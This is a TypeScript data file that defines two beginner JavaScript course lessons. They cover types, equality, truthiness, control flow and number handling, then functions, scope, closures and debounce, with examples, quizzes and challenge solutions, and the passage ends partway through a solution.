import type { LessonContent } from "./types";

/**
 * Pass 005 bounded content batch: Phase 2 opener (L1–L2).
 * Every lesson fulfills the full quality contract. No placeholders.
 */
export const LESSONS_P2: LessonContent[] = [
  {
    id: "p02-l1",
    phaseId: "p02",
    title: "Values, Types & Control Flow",
    level: "Foundation",
    minutes: 40,
    summary:
      "JavaScript has eight types, one famously buggy typeof result, a coercion system that will betray you if you let it, and a list of falsy values you must know cold. This lesson installs the type vocabulary, the === discipline, truthiness judgment, and control-flow patterns — with the money-and-zero bugs that teach them fastest.",
    prerequisites: ["p01 complete — HTML/CSS/token foundations", "p00-l2 — Node and a terminal for running snippets"],
    objectives: [
      "Name the eight JavaScript types and predict typeof results — including the typeof null trap.",
      "Explain value vs reference: why primitives copy and objects share, and what const actually locks.",
      "Recite the falsy list and choose ?? over || when 0 or '' are valid data.",
      "Defend === as the default and know the one idiomatic == case (x == null).",
      "Write control flow with early returns, switch-without-fallthrough discipline, and for…of vs for…in correctness.",
      "Handle numbers like a professional: 0.1+0.2, integer cents for money, Number vs parseInt vs parseFloat.",
    ],
    simple:
      "A program is values being transformed. Every value has a type — text (string), a quantity (number), true/false (boolean), 'nothing yet' (undefined), 'deliberately empty' (null), and a few specialists — and JavaScript will happily pretend types can change for you: add a number to a string and it glues text; compare loosely and '0' equals false. That helpfulness is the trap. This lesson teaches you to see the actual type of everything, compare with ===, treat emptiness deliberately, and let the language do arithmetic — not improvisation.",
    why:
      "Type coercion is the single largest source of 'impossible' bugs in JavaScript codebases — an id that arrives as the string \"7\" instead of 7, a price of 0 rendered as 'missing', a quantity compared with == that matches true. Every layer of this course inherits the discipline you build today: TypeScript (Phase 3) makes these decisions compile-time, NestJS DTOs (Phase 20) enforce them at the API boundary, and Postgres types (Phase 13) make them structural. Learn to see types now and the whole stack becomes a series of confirmations instead of surprises.",
    mentalModel: {
      title: "Postcards vs houses",
      body: "Primitives are postcards: when you hand one to someone, they get a copy — write on their copy and yours is untouched. let a = 5; let b = a; b = 6 leaves a at 5. Objects (arrays included) are houses: you never hand over the house, only its address. let a = [1]; let b = a; b.push(2) changes the house both addresses point to — a and b agree, because there is only one house. const locks the name tag to its address (a can't point elsewhere); it never locks the house's front door (the contents can still change). Half of all JavaScript confusion dissolves in this image.",
    },
    sections: [
      {
        heading: "The eight types — and the one lie typeof tells",
        body: [
          "Seven primitives: string, number, bigint, boolean, undefined, null, symbol — plus object (arrays, functions, dates, and everything else are objects). undefined means 'never given a value'; null means 'deliberately empty' — a choice you make, not one the language makes for you.",
          "typeof is your inspector, with one historical scar: typeof null === \"object\" — a bug from 1995 that can never be fixed without breaking the web, so you learn it as folklore. typeof of an array is also \"object\" — use Array.isArray(). And typeof of a function is \"function\", which sounds like a ninth type but is just objects being polite. NaN (Not a Number) is, gloriously, a number — the result of failed arithmetic, detectable only with Number.isNaN, because NaN === NaN is false.",
        ],
        code: [
          {
            file: "types-probe.js — run in node or the console",
            lang: "js",
            code: [
              "typeof \"hi\"        // \"string\"",
              "typeof 42          // \"number\"",
              "typeof 42n         // \"bigint\"",
              "typeof true        // \"boolean\"",
              "typeof undefined   // \"undefined\"",
              "typeof null        // \"object\"   ← the 1995 bug. Memorize it.",
              "typeof Symbol()    // \"symbol\"",
              "typeof [1, 2]      // \"object\"   ← arrays are objects to typeof",
              "Array.isArray([1]) // true        ← the real array test",
              "typeof (() => {})  // \"function\" ← functions are objects, politely",
              "",
              "Number.isNaN(NaN)      // true",
              "NaN === NaN            // false — NaN equals nothing, not even itself",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Value vs reference — copying postcards, sharing houses",
        body: [
          "Assignment copies primitives and shares objects. Two consequences bite beginners. One: 'fixing' an object through a second variable silently changes the first — the classic shared-house bug. Two: comparing objects with === tests addresses, not contents: [1,2] === [1,2] is false (two houses), while a === a is true after let b = a (one house, two addresses).",
          "Copying an object therefore requires intent: spread ({...user}) makes a shallow copy — a new house whose rooms still point at the old furniture. Deep structures need structuredClone(value), the modern built-in. This is not trivia: Phase 4's React state rules (update immutably, never mutate) are exactly the shared-house problem, enforced at the UI layer.",
        ],
        code: [
          {
            file: "copy-vs-share.js",
            lang: "js",
            code: [
              "const a = [1, 2];",
              "const b = a;          // same house, second address",
              "b.push(3);",
              "console.log(a);       // [1, 2, 3] — a saw the change too",
              "console.log(a === b); // true — same address",
              "",
              "const c = [...a];     // new house (shallow copy)",
              "c.push(4);",
              "console.log(a === c); // false — different houses",
              "",
              "const user  = { name: \"Ada\", tags: [\"math\"] };",
              "const clone = structuredClone(user); // deep copy: new furniture too",
              "clone.tags.push(\"poetry\");",
              "console.log(user.tags); // [\"math\"] — untouched",
              "",
              "const locked = { count: 0 };",
              "locked.count = 1;     // fine — const locks the name tag,",
              "// locked = {};         // ← TypeError: not the house's contents",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Truthiness — the falsy list and the zero trap",
        body: [
          "Every value coerces to true or false in a condition. Exactly eight values are falsy: false, 0, -0, 0n, \"\" (empty string), null, undefined, NaN. Everything else — including \"0\" (a non-empty string), \"false\" (also non-empty), and every object/array, even [] and {} — is truthy. That last fact shocks everyone once: an empty array is truthy, so if (items) cannot tell you a list has contents; check items.length.",
          "The professional reflex: use explicit comparisons for data questions (count === 0, name === \"\", items.length > 0) and reserve bare truthiness for presence questions (if (user)). And learn the two nullish operators — ?? (nullish coalescing) falls back only on null/undefined, while || falls back on ANY falsy. When 0 or \"\" is valid data, || is a bug wearing an operator's clothes; ?? is the fix. Optional chaining (?.) completes the set: user?.address?.city reads safely down a chain that might be nullish.",
        ],
        code: [
          {
            file: "truthiness.js — predict every line before running it",
            lang: "js",
            code: [
              "// the complete falsy list — nothing else:",
              "[false, 0, -0, 0n, \"\", null, undefined, NaN].every((v) => !v); // true",
              "",
              "Boolean([])      // true  ← empty arrays are truthy. Breathe.",
              "Boolean({})      // true  ← so is every object",
              "Boolean(\"0\")     // true  ← a non-empty string, even this one",
              "",
              "const quantity = 0;           // 0 is VALID data here",
              "quantity || 10   // 10  ← WRONG: || treated 0 as missing",
              "quantity ?? 10   // 0   ← RIGHT: only null/undefined trigger the fallback",
              "",
              "const user = null;",
              "user?.profile?.email ?? \"unknown\"  // \"unknown\", no crash",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Equality — === by default, and the one honest ==",
        body: [
          "== asks 'could these be the same after I improvise some conversions?' — and its conversion table is folklore-level horror: \"0\" == false, \"\" == 0, null == undefined (the only sensible row), [] == \"\". You cannot reason about a comparison whose rules change with the operands' moods. === asks 'same type AND same value?' (or same address, for objects) and never converts — which is why it is the default in every professional codebase and what TypeScript's world assumes.",
          "The single idiomatic exception: x == null, which is true for BOTH null and undefined — a compact 'is this missing?' test that === would need two comparisons for. Use that one deliberately, and write x === null or x === undefined when you care which. For numbers, remember Object.is handles the corners === doesn't: Object.is(NaN, NaN) is true, Object.is(0, -0) is false.",
        ],
        code: [
          {
            file: "equality.js",
            lang: "js",
            code: [
              '"0" == false      // true   ← coercion horror',
              '"" == 0          // true   ← more horror',
              '"0" === false     // false  ← different types, no conversion, no drama',
              "",
              "null == undefined   // true  — the one sensible loose row",
              "null === undefined  // false — and === correctly disagrees",
              "",
              "function load(id) {",
              "  if (id == null) return \"missing\"; // null OR undefined, on purpose",
              "  // ...",
              "}",
              "",
              "Object.is(NaN, NaN)  // true  — the corner === can't see",
              "Object.is(0, -0)     // false — and the one it over-sees",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Control flow — early returns, honest switches, the right loop",
        body: [
          "Three habits separate readable control flow from nested spaghetti. One: guard clauses — test the failure case and return immediately, so the happy path runs at zero indentation. Two: switch statements fall through unless you break; modern code prefers the no-fallthrough shape (or a lookup object) and reserves switch for genuinely enumerable states — like the status transitions you'll build in Phase 42. Three: pick the loop for the job — for…of walks VALUES of iterables (arrays, strings, maps); for…in walks KEYS of objects and will happily iterate inherited junk if you let it; the classic for loop remains for when the index itself is data.",
          "The ternary is for choosing between two EXPRESSIONS (const label = done ? \"Done\" : \"Open\") — not for side-effect pyramids. If a ternary needs scrolling, it wanted to be an if.",
        ],
        code: [
          {
            file: "control-flow.js",
            lang: "js",
            code: [
              "// guard clauses beat nesting:",
              "function discount(user, total) {",
              "  if (user == null) return 0;      // missing user → done",
              "  if (total < 100) return 0;       // small order → done",
              "  if (user.plan !== \"gold\") return 5;",
              "  return 15;                        // happy path, zero nesting",
              "}",
              "",
              "// for…of = values; for…in = keys:",
              "for (const item of [\"a\", \"b\"]) console.log(item);   // a, b",
              "for (const key in { x: 1, y: 2 }) console.log(key); // x, y",
              "",
              "// switch without fallthrough footguns:",
              "switch (status) {",
              "  case \"open\":    return \"In progress\";",
              "  case \"closed\":  return \"Done\";",
              "  default:        return \"Unknown\"; // always a default",
              "}",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Numbers — 0.1 + 0.2, and why money is integer cents",
        body: [
          "JavaScript numbers are 64-bit floats: fast, wide-range, and unable to represent most decimals exactly. 0.1 + 0.2 is 0.30000000000000004 — not a bug, but binary arithmetic telling the truth about a number that has no finite binary form. Never compare floats with ===; use a tolerance, or better, restructure so you never needed to.",
          "The professional answer for money: store integer cents (or smallest units) and divide only at display time — 1999 cents, never 19.99. It is the same discipline PostgreSQL's Decimal type enforces in Phase 13, and why every serious system you'll build keeps arithmetic in integers and formatting in the presentation layer. For parsing, know the trio: Number(\"42px\") → NaN (strict), parseInt(\"42px\") → 42 (reads a prefix, always pass the radix: parseInt(s, 10)), parseFloat(\"3.5em\") → 3.5. And toFixed returns a STRING — \"19.99\" — which is a formatting tool, not arithmetic.",
        ],
        code: [
          {
            file: "numbers.js",
            lang: "js",
            code: [
              "0.1 + 0.2                    // 0.30000000000000004 — binary truth",
              "0.1 + 0.2 === 0.3            // false. Never === with floats.",
              "Math.abs((0.1 + 0.2) - 0.3) < 1e-9  // the tolerance pattern",
              "",
              "// money as integer cents — the whole industry's answer:",
              "const cart = [1999, 450, 1200];           // cents",
              "const totalCents = cart.reduce((s, c) => s + c, 0); // 3649",
              "const display = `$${(totalCents / 100).toFixed(2)}`; // \"$36.49\"",
              "",
              'Number(\"42px\")   // NaN — strict, all-or-nothing',
              'parseInt(\"42px\", 10)  // 42 — prefix reader; ALWAYS pass the radix',
              '(19.5).toFixed(1)      // \"19.5\" — a STRING, for display only',
            ].join("\n"),
          },
        ],
      },
    ],
    mistake: {
      title: "The zero that vanished",
      wrong: [
        "function renderCartCount(count) {",
        "  if (count) {            // 0 is falsy — the badge disappears",
        "    badge.textContent = count;",
        "  } else {",
        "    badge.textContent = \"10\";   // 'default' silently wins over real data",
        "  }",
        "}",
        "// same disease:",
        "const label = response.status || \"OK\";  // status 0 → \"OK\"?? ",
      ].join("\n"),
      right: [
        "function renderCartCount(count) {",
        "  if (count === undefined || count === null) {",
        "    badge.textContent = \"10\";   // fallback only for MISSING data",
        "    return;",
        "  }",
        "  badge.textContent = count;    // 0 renders as 0",
        "}",
        "// or, terser:",
        "const label = response.status ?? \"OK\";  // nullish-only fallback",
      ].join("\n"),
      explain:
        "Bare truthiness and || treat 0, '', and false as missing — so valid data gets silently replaced by defaults. This exact bug ships in production dashboards daily (a metric of 0 showing the fallback). Reserve truthiness for presence; use === and ?? for data.",
    },
    tryIt: [
      "Open node (or the console) and predict-then-verify every line of types-probe.js. How many did you get wrong? typeof null and Boolean([]) are the classics.",
      "Write a five-line script that proves objects share: create an array, alias it, mutate the alias, and print both. Then fix it with spread and structuredClone and print again.",
      "List the falsy values from memory, then check with the .every probe. Now predict Boolean(\"false\"), Boolean(NaN), Boolean(0n) before running them.",
      "Refactor this into guard clauses: function f(u, t) { if (u) { if (t > 100) { if (u.plan === \"gold\") { return 15; } else { return 5; } } else { return 0; } } else { return 0; } }",
      "Build a tiny 'receipt' in integer cents: three prices, a sum with reduce, and a display string via toFixed. Confirm no float ever touches the arithmetic.",
    ],
    challenge: {
      prompt:
        "Write a describeValue(value) function that returns a precise human sentence about ANY input. It must correctly identify: the seven primitives by name (with bigint spelled out), null (despite typeof's lie), arrays (via Array.isArray, reporting length), plain objects (reporting key count via Object.keys), functions, and for numbers: NaN, -0 (use Object.is), integers vs non-integers (Number.isInteger), and the 0.1+0.2 float artifact when present. Examples: describeValue(null) → 'null — the deliberate empty (typeof lies and says object)'; describeValue([1,2]) → 'array with 2 items'; describeValue(0.30000000000000004) → 'number (non-integer, float artifact — likely 0.1+0.2)'.",
      hints: [
        "Order matters: check value === null before any typeof (the lie), and Array.isArray before the generic object branch.",
        "-0 prints as '0', so detect it with Object.is(value, -0). NaN fails every comparison except Number.isNaN.",
        "For the float artifact, you don't need to detect the exact bits — checking !Number.isInteger(v) and v.toString().length > 17 is a reasonable heuristic; note it as a heuristic in a comment.",
      ],
      solution: [
        "function describeValue(value) {",
        "  // 1) the typeof lie, handled first:",
        "  if (value === null) {",
        "    return \"null — the deliberate empty (typeof lies and says object)\";",
        "  }",
        "",
        "  const t = typeof value;",
        "",
        "  // 2) number corners before the generic case:",
        "  if (t === \"number\") {",
        "    if (Number.isNaN(value)) return \"number — NaN (failed arithmetic)\";",
        "    if (Object.is(value, -0)) return \"number — negative zero\";",
        "    if (Number.isInteger(value)) return `number — integer ${value}`;",
        "    if (value.toString().length > 17) {",
        "      // heuristic: suspiciously long decimal — the 0.1+0.2 family",
        "      return \"number (non-integer, float artifact — likely 0.1+0.2)\";",
        "    }",
        "    return `number — non-integer ${value}`;",
        "  }",
        "",
        "  // 3) objects: array first, then function, then plain:",
        "  if (t === \"object\") {",
        "    return Array.isArray(value)",
        "      ? `array with ${value.length} item${value.length === 1 ? \"\" : \"s\"}`",
        "      : `object with ${Object.keys(value).length} key(s)`;",
        "  }",
        "  if (t === \"function\") return \"function — an object you can call\";",
        "",
        "  // 4) the remaining primitives speak for themselves:",
        "  if (t === \"string\") {",
        "    return value === \"\" ? \"string — empty (falsy!)\" : `string of ${value.length} chars`;",
        "  }",
        "  return `${t} — ${String(value)}`; // boolean, undefined, bigint, symbol",
        "}",
        "",
        "// try: describeValue(null) / ([1,2]) / (0.1+0.2) / (42n) / (-0)",
        "// Notice the shape: null first, corners before generics,",
        "// arrays before objects — an ordering discipline you'll reuse",
        "// in TypeScript narrowing (Phase 3) and DTO validation (Phase 20).",
      ].join("\n"),
    },
    quiz: [
      {
        q: "typeof null evaluates to…",
        options: ["\"object\" — a 1995 bug that can never be fixed", "\"null\"", "\"undefined\"", "It throws"],
        answer: 0,
        explain: "The most famous bug in the language. Test for null with value === null (or == null for null-or-undefined), never with typeof.",
      },
      {
        q: "Which of these is falsy?",
        options: ["0n (bigint zero)", "\"0\" (the string)", "[] (empty array)", "{} (empty object)"],
        answer: 0,
        explain: "The falsy list is exactly eight: false, 0, -0, 0n, \"\", null, undefined, NaN. Non-empty strings and ALL objects — even empty ones — are truthy.",
      },
      {
        q: "const price = 0; price || 99 returns 99. The fix for 'valid zero' is…",
        options: ["price ?? 99 — falls back only on null/undefined", "price === 0 || 99", "Boolean(price) || 99", "There is no fix"],
        answer: 0,
        explain: "|| falls back on ANY falsy; ?? falls back only on nullish values. Whenever 0/''/false is legitimate data, ?? is the operator.",
      },
      {
        q: "\"0\" == false is true, yet \"0\" === false is false, because…",
        options: ["=== requires the same type first and never coerces", "== is faster", "=== only works on numbers", "false coerces to \"0\""],
        answer: 0,
        explain: "=== compares type then value with zero improvisation — which is why it's the professional default. The one deliberate == idiom: x == null.",
      },
      {
        q: "for…in is the wrong tool for iterating an array because…",
        options: ["It yields string keys (and can include inherited ones), not values", "It's slower than for…of", "It can't read arrays", "It mutates the array"],
        answer: 0,
        explain: "for…in walks enumerable keys of objects; for…of walks values of iterables. Arrays want values: for…of (or map/filter in Phase 2's array lesson).",
      },
      {
        q: "The professional way to total a cart of prices is…",
        options: ["Integer cents summed with reduce; divide only at display time", "Float dollars summed with +", "parseFloat each item, then toFixed", "BigInt dollars"],
        answer: 0,
        explain: "Floats can't represent most decimals exactly (0.1+0.2). Integer smallest-units keep arithmetic exact — the same discipline Postgres Decimal enforces in Phase 13.",
      },
    ],
    flashcards: [
      { front: "The eight JS types", back: "string, number, bigint, boolean, undefined, null, symbol (primitives) + object. Arrays/functions/dates are objects." },
      { front: "typeof null", back: "\"object\" — a 1995 bug frozen into the language. Test null with === null (or == null for null-or-undefined)." },
      { front: "Falsy list", back: "false, 0, -0, 0n, \"\", null, undefined, NaN — exactly eight. Everything else is truthy, including [], {}, and \"0\"." },
      { front: "?? vs ||", back: "?? falls back only on null/undefined; || falls back on any falsy. Use ?? whenever 0 or '' is valid data." },
      { front: "=== vs ==", back: "===: same type and value, no coercion — the default. The one honest ==: x == null catches null AND undefined." },
      { front: "Value vs reference", back: "Primitives copy on assignment (postcards); objects share addresses (houses). const locks the binding, never the contents." },
      { front: "Deep copy", back: "structuredClone(value) — the built-in deep copy. Spread ({...x}) is shallow: new shell, shared innards." },
      { front: "Money math", back: "Integer cents end to end; divide by 100 only at display time. toFixed returns a string — it formats, it doesn't compute." },
    ],
    recap: [
      "Eight types; typeof lies about null; arrays hide inside \"object\" until Array.isArray.",
      "Primitives copy, objects share; const locks bindings, not contents; structuredClone copies deep.",
      "Falsy is exactly eight values; ?? beats || when zero or empty-string is real data.",
      "=== everywhere, x == null as the one deliberate loose comparison.",
      "Guard clauses over nesting; for…of for values, for…in for keys; money lives in integer cents.",
    ],
    references: [
      { label: "MDN — JavaScript data types", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures" },
      { label: "MDN — typeof", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof" },
      { label: "MDN — Nullish coalescing (??)", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Nullish_coalescing" },
      { label: "MDN — Equality comparisons and sameness", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness" },
      { label: "MDN — for…of", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of" },
    ],
    nextBridge:
      "You can now see types, copy values deliberately, and route logic cleanly. Next lesson makes functions first-class: the forms they take, the scope they see, and closures — functions carrying backpacks — which quietly power every debounce, every private counter, and eventually every React hook you will ever write.",
  },
  {
    id: "p02-l2",
    phaseId: "p02",
    title: "Functions, Scope & Closures",
    level: "Foundation",
    minutes: 45,
    summary:
      "Functions are values you can pass, return, and store. Scope decides which names a line of code can see, and closures are functions that carry the scope they were born in — a backpack of variables that survives long after the outer function returns. This lesson makes all three concrete, then builds the two closure tools you will use for the rest of your career: private state and debounce.",
    prerequisites: ["p02-l1 — values, types, truthiness, and the === discipline"],
    objectives: [
      "Write functions in all three forms and explain what arrows change (and what they don't).",
      "Trace the scope lookup chain and predict shadowing, block scope, and the var legacy.",
      "Explain hoisting: function declarations vs let/const in the temporal dead zone.",
      "Define a closure as function + captured scope, and build factories with private state.",
      "Diagnose and fix the classic loop-variable bug (var + setTimeout) from first principles.",
      "Implement debounce as a closure and explain every line of why it works.",
    ],
    simple:
      "A function is a recipe you can hand around like an object — store it in a variable, pass it to another function, return it as a result. Scope is visibility: code can see its own variables, then the variables of every scope it's nested inside, walking outward until it hits global — never inward. A closure is the surprising consequence: when a function is created, it packs a backpack of the variables around it, and it keeps that backpack wherever it goes. Create a counter inside a function and return it, and its count variable lives on inside the backpack — private, persistent, and impossible to touch from outside. That trick is half of professional JavaScript.",
    why:
      "Closures are not an advanced curiosity — they are the substrate. Debouncing a search box? Closure over a timer. A React hook remembering state between renders? Closure over a cell. A callback that knows which row's delete button was clicked? Closure over the row. Developers who never internalize scope produce the two most common bugs in the language: 'undefined is not defined' (looked for a name in the wrong scope) and the stale value (read a backpack that was packed earlier than they think). Learn the backpack model now and Phase 5's hook debugging labs become pattern-matching instead of archaeology.",
    mentalModel: {
      title: "The backpack",
      body: "When a function is born, someone zips a backpack containing every variable in scope at that exact moment — parameters, locals, outer locals. The function carries that backpack for life; every call unzips ITS OWN backpack, never the scope where it happens to be called. Spawn two counters from the same factory and each gets a separate backpack with a separate count — they can't see each other's supplies, and neither can you from outside. 'Closure' is just the name for a function that refuses to travel without its backpack. Everything else — private state, debounce timers, per-row callbacks — is choosing what to pack.",
    },
    sections: [
      {
        heading: "Functions are values — three ways to write one",
        body: [
          "Declaration (function greet() {}), expression (const greet = function () {}), and arrow (const greet = () => {}). All three are values: you can pass them as arguments, return them, and put them in arrays. Declarations are hoisted (usable before their line — next section); expressions and arrows exist only from their assignment onward, which is why most modern codebases standardize on const + arrow for predictability.",
          "Arrows bring two mechanical differences that matter. One: they have no own this — they inherit it from the scope that defined them, which fixes the classic 'this went undefined inside my callback' bug and makes them the right default inside methods and event handlers. Two: no arguments object (use rest parameters ...args instead). What arrows do NOT change: they still close over scope exactly like any other function. Default parameters (ms = 300) and rest (...items) round out the modern signature.",
        ],
        code: [
          {
            file: "function-forms.js",
            lang: "js",
            code: [
              "// three forms, one idea: functions are values",
              "function add(a, b = 0) { return a + b; }      // declaration (hoisted)",
              "const sub = function (a, b) { return a - b; }; // expression",
              "const mul = (a, b) => a * b;                   // arrow: implicit return",
              "",
              "const ops = [add, sub, mul];        // values you can store…",
              "ops.map((op) => op(6, 3));          // [9, 3, 18] …and pass around",
              "",
              "// rest parameters collect the extras:",
              "const total = (...nums) => nums.reduce((s, n) => s + n, 0);",
              "total(1, 2, 3, 4);  // 10",
              "",
              "// arrows inherit `this` from where they're WRITTEN —",
              "// the fix for callbacks inside methods:",
              "const timer = {",
              "  seconds: 0,",
              "  start() {",
              "    setInterval(() => this.seconds++, 1000); // `this` stays the timer",
              "  },",
              "};",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Scope — the outward-only lookup",
        body: [
          "Every { } block plus every function body creates a scope. When code reads a name, the engine looks here, then in the enclosing scope, then further out, until global — and stops at the first hit. Lookup travels outward ONLY: inner scopes see outer variables, outer scopes see nothing of the inner ones. Shadowing (declaring an inner name that hides an outer one) is legal but a readability tax — rename instead when you can.",
          "The modern rule: let and const are block-scoped (they die at the nearest }), and const is the default — reassign with let only when the binding genuinely changes. var is function-scoped legacy: it ignores blocks, hoists as undefined, and its survival in old codebases is the reason you must recognize it — not the reason to write it. The one place var still lurks productively in tutorials is exactly the bug in section five, which is how you'll learn its danger permanently.",
        ],
        code: [
          {
            file: "scope.js",
            lang: "js",
            code: [
              "const app = \"outer\";",
              "",
              "function report() {",
              "  const app = \"inner\";      // shadows the outer name (legal, smelly)",
              "  console.log(app);          // \"inner\" — nearest scope wins",
              "}",
              "report();",
              "console.log(app);            // \"outer\" — untouched, lookup is outward-only",
              "",
              "if (true) {",
              "  let blockOnly = \"gone at the brace\";",
              "  var leaked = \"I survive the block (function/global scope)\";",
              "}",
              "// console.log(blockOnly);  // ReferenceError — block scope held the line",
              "console.log(leaked);        // survives — why var is retired, not forgotten",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Hoisting — what rises, and the dead zone that doesn't",
        body: [
          "Before running a scope, the engine reads through it and registers declarations — hoisting. Function declarations rise fully formed: you can call them above their line, which is why codebases put 'main' logic up top and helpers below. var rises too, but as an empty shell: reading it before its line gives undefined, not an error — the silent bug factory behind many 'why is this undefined' mysteries.",
          "let and const rise differently: they are registered but locked in the temporal dead zone until execution reaches their line — reading early throws ReferenceError, which is the language protecting you from the var-era shell game. Practical takeaway: const/let at point of use, function declarations when you want hoisted helpers, var never on purpose.",
        ],
        code: [
          {
            file: "hoisting.js",
            lang: "js",
            code: [
              "greet();                     // works — declarations hoist complete",
              "function greet() { console.log(\"hi\"); }",
              "",
              "console.log(shell);          // undefined — var hoists as an empty shell",
              "var shell = \"filled later\";",
              "",
              "// console.log(locked);      // ReferenceError: temporal dead zone",
              "const locked = \"no early reads\";  // the TDZ ends here",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Closures — the backpack in action",
        body: [
          "A factory is a function that returns a function; the returned function closes over the factory's locals. Each call to the factory runs the body fresh — fresh backpack. That gives you two superpowers at once: persistent private state (count survives between calls, unreachable from outside) and per-instance isolation (two counters never share a count). There is no class, no #private syntax, no getter — just scope doing its job.",
          "Read closure code by asking 'which backpack is this call unzipping?' The counter below captures n in makeCounter's scope; increment and read both reference that same n. Nothing else can reach it — try counter.n and you'll get undefined, because n was never a property; it was luggage.",
        ],
        code: [
          {
            file: "closures.js — private state without classes",
            lang: "js",
            code: [
              "function makeCounter(start = 0) {",
              "  let n = start;                    // packed into the backpack",
              "  return {",
              "    increment: () => ++n,           // unzips THIS factory run's backpack",
              "    read: () => n,",
              "  };",
              "}",
              "",
              "const a = makeCounter();",
              "const b = makeCounter(100);         // a SECOND backpack, independent",
              "a.increment(); a.increment();",
              "b.increment();",
              "a.read();  // 2",
              "b.read();  // 101 — isolation is free",
              "",
              "a.n        // undefined — n is luggage, not a property",
              "",
              "// same mechanic, smaller: the adder",
              "const makeAdder = (x) => (y) => x + y;",
              "const add10 = makeAdder(10);",
              "add10(5);  // 15 — x survived inside add10's backpack",
            ].join("\n"),
          },
        ],
        demo: "closure-lab",
      },
      {
        heading: "The loop bug that teaches var forever — and debounce, its payoff",
        body: [
          "The rite of passage: three setTimeout callbacks inside a var loop all print 3. Why? There is ONE i (var is function-scoped), and the callbacks read i LATER — by which time the loop has finished and i is 3. The backpack contains the variable, not a snapshot of its value. Switch to let and the bug evaporates: each iteration gets its own block-scoped i, so each callback packs a different backpack. If you can explain that sentence, you understand closures.",
          "Now the payoff — debounce: collapse a burst of calls into one, fired after the bursts stop. The returned function closes over the timer id; every keystroke CLEARS the pending timer and sets a new one, so only a full pause lets the call through. This exact closure guards every search box, resize handler, and autosave you will ever build — and it is 6 lines.",
        ],
        code: [
          {
            file: "loop-bug-and-debounce.js",
            lang: "js",
            code: [
              "// THE classic: var shares one backpack slot across all callbacks",
              "for (var i = 0; i < 3; i++) {",
              "  setTimeout(() => console.log(i), 10);",
              "}",
              "// prints 3, 3, 3 — all three read the SAME i, after the loop ended",
              "",
              "for (let i = 0; i < 3; i++) {",
              "  setTimeout(() => console.log(i), 10);",
              "}",
              "// prints 0, 1, 2 — let gives each iteration its own i, its own backpack",
              "",
              "// debounce: the closure you will ship for the rest of your career",
              "function debounce(fn, ms) {",
              "  let timerId;                       // private, persistent between calls",
              "  return (...args) => {",
              "    clearTimeout(timerId);           // a new burst kills the pending call",
              "    timerId = setTimeout(() => fn(...args), ms);",
              "  };",
              "}",
              "",
              "const logSearch = debounce((q) => console.log(\"search:\", q), 300);",
              "logSearch(\"h\"); logSearch(\"ho\"); logSearch(\"hooks\");",
              "// ONE log, after 300ms of silence: \"search: hooks\"",
            ].join("\n"),
          },
        ],
      },
    ],
    mistake: {
      title: "The backpack packed too early (stale closure)",
      wrong: [
        "let count = 0;",
        "const onClicks = [];",
        "for (var i = 0; i < 3; i++) {",
        "  onClicks.push(() => console.log(\"clicked button\", i));",
        "}",
        "onClicks.forEach((fn) => fn());",
        "// \"clicked button 3\" × 3 — every callback shares ONE i,",
        "// and all read it AFTER the loop finished.",
        "",
        "// same disease in React later: an effect captures state once",
        "// and keeps serving the stale value from its old backpack.",
      ].join("\n"),
      right: [
        "const onClicks = [];",
        "for (let i = 0; i < 3; i++) {",
        "  onClicks.push(() => console.log(\"clicked button\", i));",
        "}",
        "onClicks.forEach((fn) => fn());",
        "// 0, 1, 2 — each iteration's block-scoped i is its own",
        "// backpack slot, captured fresh by each arrow.",
        "",
        "// Rule: a closure captures VARIABLES, not values.",
        "// Ask 'which backpack, packed when?' before trusting a capture.",
      ].join("\n"),
      explain:
        "Closures hold live references to variables, not photographs of values. With var there is one variable shared by every callback, read after the loop ends — so all see the final value. let creates a fresh binding per iteration; each callback captures its own. This exact mechanic reappears in Phase 5 as stale-state-in-effect bugs; the question that fixes both is identical.",
    },
    tryIt: [
      "Predict, then run: write makeCounter, spawn two counters, and log both after three increments of the first. Explain the isolation in one sentence using the word 'backpack'.",
      "Break hoisting on purpose: call an arrow-function expression before its const line and read the error message aloud — it names the temporal dead zone concept (Cannot access before initialization). Then move the call below and watch it work.",
      "Reproduce the 3-3-3 loop bug with var, fix it with let, and re-run. Now explain it to an imaginary junior developer in two sentences.",
      "Trace the debounce above on paper: draw a timeline of keystrokes at t=0, 50, 100ms with a 300ms delay. When does fn fire? What if a fourth keystroke lands at t=350ms?",
      "Write once(fn): returns a function that runs fn only on its FIRST call and ignores the rest — a closure over a done flag. Test it with a function that logs.",
    ],
    challenge: {
      prompt:
        "Build a tiny 'closure bank' with three factories — no classes, no globals, nothing exposed that shouldn't be. (1) createAccount(openingBalance): returns { deposit(n), withdraw(n), balance() } where the balance can never go negative (withdraw of too much returns false and changes nothing) and the raw balance variable is unreachable from outside. (2) once(fn): wraps fn so only its first call executes (later calls return the first call's result). (3) debounce(fn, ms) from the lesson — then compose them: a logExpense = debounce(accounting function, 250) that deposits into an account; prove a rapid burst deposits exactly once.",
      hints: [
        "The balance lives as a let inside createAccount; the three returned methods are the ONLY doors. Withdraw checks amount > 0 && amount <= balance before touching it.",
        "once needs two backpack items: a called flag and a storedResult. Return storedResult on repeats so the first result is sticky.",
        "To prove 'exactly once', have the debounced function log the deposit amount and the resulting balance; fire it 5 times fast, wait 300ms (setTimeout or just observe the single log).",
      ],
      solution: [
        "function createAccount(openingBalance = 0) {",
        "  let balance = openingBalance;      // private — luggage, not a property",
        "  return {",
        "    deposit(n) {",
        "      if (typeof n !== \"number\" || n <= 0) return false;",
        "      balance += n;",
        "      return true;",
        "    },",
        "    withdraw(n) {",
        "      if (typeof n !== \"number\" || n <= 0 || n > balance) return false;",
        "      balance -= n;                  // can never go negative: guarded above",
        "      return true;",
        "    },",
        "    balance: () => balance,",
        "  };",
        "}",
        "",
        "function once(fn) {",
